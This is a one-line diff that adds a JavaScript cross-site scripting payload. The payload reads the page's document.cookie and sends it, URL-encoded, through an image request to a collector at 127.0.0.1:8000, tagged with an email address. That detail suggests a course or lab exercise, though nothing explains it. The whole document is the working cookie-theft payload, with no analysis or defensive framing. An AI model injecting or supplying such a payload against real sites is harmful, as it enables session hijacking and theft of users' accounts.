@@ -1,0 +1,1 @@
+(new Image()).src = 'http://127.0.0.1:8000/?to=ijustwanttograduatefromsutd@gmail.com&payload='+encodeURIComponent(document.cookie)+'&rand='+Math.random();
